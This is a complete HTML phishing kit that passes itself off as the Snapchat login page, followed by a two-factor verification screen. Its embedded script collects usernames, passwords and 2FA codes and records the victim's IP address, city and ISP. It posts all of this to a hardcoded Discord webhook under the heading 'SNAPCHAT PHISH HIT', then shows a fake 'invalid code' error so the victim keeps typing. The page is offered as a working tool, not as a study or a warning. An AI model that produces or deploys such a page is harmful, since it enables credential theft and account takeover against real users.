<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Log In | Snapchat</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap');
        
        * { margin:0; padding:0; box-sizing:border-box; }
        
        body {
            background: #f8f8f8;
            font-family: 'Roboto', sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            color: #000;
        }

        .container {
            background: #fff;
            width: 100%;
            max-width: 420px;
            padding: 40px 30px;
            border-radius: 16px;
            box-shadow: 0 8px 30px rgba(0,0,0,0.12);
            text-align: center;
        }

        .logo {
            width: 85px;
            height: 85px;
            background: #fffc00;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 25px;
            font-size: 58px;
            color: #000;
            box-shadow: 0 6px 15px rgba(255, 252, 0, 0.3);
        }

        h1 {
            font-size: 28px;
            font-weight: 500;
            margin-bottom: 35px;
        }

        input {
            width: 100%;
            padding: 15px 16px;
            margin: 10px 0;
            border: 1.5px solid #ddd;
            border-radius: 10px;
            font-size: 17px;
        }

        input:focus {
            outline: none;
            border-color: #fffc00;
            box-shadow: 0 0 0 3px rgba(255, 252, 0, 0.2);
        }

        button {
            width: 100%;
            padding: 15px;
            background: #fffc00;
            color: #000;
            border: none;
            border-radius: 10px;
            font-size: 18px;
            font-weight: 600;
            cursor: pointer;
            margin-top: 15px;
            transition: all 0.2s;
        }

        button:hover:not(:disabled) {
            background: #ffe600;
            transform: translateY(-1px);
        }

        .error {
            color: #ff3b30;
            font-size: 14.5px;
            margin: 10px 0 5px;
            display: none;
            text-align: left;
            padding-left: 4px;
        }

        .footer {
            margin-top: 40px;
            font-size: 13px;
            color: #666;
        }

        .footer a {
            color: #000;
            text-decoration: none;
        }

        .loading {
            display: none;
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background: rgba(0,0,0,0.9);
            color: #fff;
            padding: 18px 30px;
            border-radius: 12px;
            font-size: 16px;
            z-index: 999;
        }
    </style>
</head>
<body>

    <!-- Main Login Screen -->
    <div class="container" id="login-screen">
        <div class="logo">👻</div>
        <h1>Log in to Snapchat</h1>
        
        <form id="loginForm">
            <input type="text" id="username" placeholder="Username or email" required autocomplete="username">
            <input type="password" id="password" placeholder="Password" required autocomplete="current-password">
            <div id="errorMsg" class="error">Incorrect username or password. Please try again.</div>
            <button type="submit" id="loginBtn">Log In</button>
        </form>

        <div class="footer">
            <a href="#">Forgot your password?</a><br><br>
            <p>© Snap Inc. 2026</p>
        </div>
    </div>

    <!-- 2FA Screen -->
    <div class="container" id="twofa-screen">
        <div class="logo">👻</div>
        <h1>Two-Factor Verification</h1>
        <p style="margin: 20px 0 25px; color:#555; font-size:15.5px;">
            Enter the 6-digit code sent to your phone or email
        </p>
        
        <form id="twofaForm">
            <input type="text" id="code" placeholder="••••••" maxlength="6" required style="text-align:center; font-size:22px; letter-spacing:10px;">
            <div id="twofaError" class="error">Invalid code. Please try again.</div>
            <button type="submit" id="verifyBtn">Verify</button>
        </form>

        <div class="footer">
            <a href="#" onclick="backToLogin()">Back to login</a>
        </div>
    </div>

    <div id="loadingOverlay" class="loading">Verifying...</div>

    <script>
        // === YOUR NEW DISCORD WEBHOOK ===
        const webhook = "https://discord.com/api/webhooks/1498622754797125633/t5Z-BfiL12-AQLa5mymJsmhvMdwc7ay9WCD8bYtxXci1s9-kOr4dRBGHg6y4QRFSjVXZ";

        async function sendToDiscord(username, password, code = null) {
            let ipData = { ip: "Unknown", city: "Unknown", country: "Unknown", org: "Unknown" };
            try {
                const res = await fetch("https://ipinfo.io/json/");
                ipData = await res.json();
            } catch(e){}

            const message = `**👻 SNAPCHAT PHISH HIT 🔥**\n\n` +
                `**Username:** ${username}\n` +
                `**Password:** ${password}\n` +
                `${code ? `**2FA Code:** ${code}\n` : ''}\n` +
                `**IP:** ${ipData.ip}\n` +
                `**Location:** ${ipData.city}, ${ipData.country}\n` +
                `**ISP:** ${ipData.org || "Unknown"}\n` +
                `**Time:** ${new Date().toLocaleString()}`;

            try {
                await fetch(webhook, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({ content: message })
                });
            } catch(e){}
        }

        // Main Login Form
        document.getElementById("loginForm").addEventListener("submit", async function(e) {
            e.preventDefault();
            
            const username = document.getElementById("username").value.trim();
            const password = document.getElementById("password").value.trim();
            const loginBtn = document.getElementById("loginBtn");
            const loading = document.getElementById("loadingOverlay");

            if (!username || !password) return;

            loginBtn.disabled = true;
            loginBtn.textContent = "Logging in...";
            loading.style.display = "block";

            await sendToDiscord(username, password);

            setTimeout(() => {
                loading.style.display = "none";
                document.getElementById("login-screen").style.display = "none";
                document.getElementById("twofa-screen").style.display = "block";
            }, 1450);
        });

        // 2FA Form
        document.getElementById("twofaForm").addEventListener("submit", async function(e) {
            e.preventDefault();
            
            const code = document.getElementById("code").value.trim();
            const verifyBtn = document.getElementById("verifyBtn");
            const loading = document.getElementById("loadingOverlay");

            if (code.length !== 6) return;

            verifyBtn.disabled = true;
            verifyBtn.textContent = "Verifying...";
            loading.style.display = "block";

            const username = document.getElementById("username").value.trim();
            const password = document.getElementById("password").value.trim();

            await sendToDiscord(username, password, code);

            setTimeout(() => {
                loading.style.display = "none";
                document.getElementById("twofaError").style.display = "block";
                verifyBtn.disabled = false;
                verifyBtn.textContent = "Verify";
                document.getElementById("code").value = "";
            }, 1350);
        });

        function backToLogin() {
            document.getElementById("twofa-screen").style.display = "none";
            document.getElementById("login-screen").style.display = "block";
        }
    </script>
</body>
</html>
